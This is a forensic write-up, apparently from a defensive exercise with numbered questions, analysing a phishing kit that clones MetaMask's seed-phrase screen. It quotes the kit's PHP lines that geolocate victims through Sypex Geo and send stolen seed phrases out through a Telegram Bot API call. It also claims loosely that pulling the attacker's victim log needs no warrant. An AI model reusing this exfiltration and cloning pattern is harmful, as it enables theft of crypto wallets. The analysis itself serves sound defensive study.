Scenario: A DeFi platform reported multiple users hit by unauthorized fund withdrawals. A forensic review uncovered a phishing site impersonating the legitimate PancakeSwap exchange, luring victims into entering their wallet seed phrases. The kit was hosted on a compromised server and exfiltrated stolen credentials via a Telegram bot. The task: read the kit's source directly to map its infrastructure, IOCs, and the developer's own footprint left behind in the code.

Kit Anatomy

The extracted phishing kit sits in a small, self-contained folder — fonts/, a stray .DS_Store (a giveaway the developer built this on macOS), an 820 KB index file, and a 2 KB metamask.php. The index file is the entire client-side clone: a pixel-accurate copy of MetaMask's real "import wallet" screen, down to the exact CSS class names (import-account__title, import-account__secret-phrase) used by the genuine extension. That visual fidelity is the whole trick — victims see a UI they already trust and don't think twice about pasting in their seed phrase.

Everything that actually matters, though, is in the tiny PHP file. metamask.php is a single-purpose credential harvester: it geolocates the victim, timestamps the theft, writes the seed phrase to a local log, and immediately relays it out over Telegram — all in under 25 lines of code. There's no obfuscation, no encoding, no attempt to hide intent; this is a commodity kit built for speed and volume, not stealth against anyone who actually opens the file.
Q1Which wallet is used for asking the seed phrase?
The extracted kit's index page renders a MetaMask-branded "Continue with Seed Phrase" import screen. The markup lifts MetaMask's own component structure directly — <div class="import-account__title">Continue with Seed Phrase</div> and a textarea class="import-account__secret-phrase" with the placeholder "Separate each word with a single space" — so the clone behaves identically to the real extension's UI, right down to the 12-word validation prompt.

Q4What service does the kit use to retrieve the victim's machine information?
cat metamask.php
The first block of metamask.php does victim profiling before anything else is even shown:
$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']);
It passes the victim's own IP straight to the Sypex Geo API, decodes the JSON response, and pulls out $geo (country) and $city before formatting a $date stamp — so every stolen seed phrase gets geolocated and timestamped automatically, no manual lookup needed on the attacker's end.
answerSypex Geo

Q7Which medium was used for credential dumping?

The sendTel() function is where the theft actually leaves the server:
$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message);
It builds a standard Telegram Bot API sendMessage call and fires it with file_get_contents($filename) — no custom C2, no dedicated server to seize, just a legitimate third-party API abused as a drop point.

Lessons learned: Crypto phishing kits rarely reinvent the UI — they clone the real wallet's import flow pixel-for-pixel, class names and all, which makes visual triage unreliable and source review essential. Telegram bots remain the exfiltration channel of choice for commodity kits: cheap, fast, and a token + chat ID pair extracted from the source is often enough to pull the attacker's entire victim log directly from the Telegram Bot API, no warrant required. The kit's total lack of obfuscation — hardcoded token, plaintext log, unminified PHP — is typical of mass-market kits optimized for volume over stealth; the attacker is betting on victims never inspecting the page source, not on defeating an analyst who does. Kit authors frequently leave a "signature" in commented-out code — a nickname, a shoutout, an alias — which is genuinely useful for attribution and for spotting the same kit reused across other phishing campaigns.
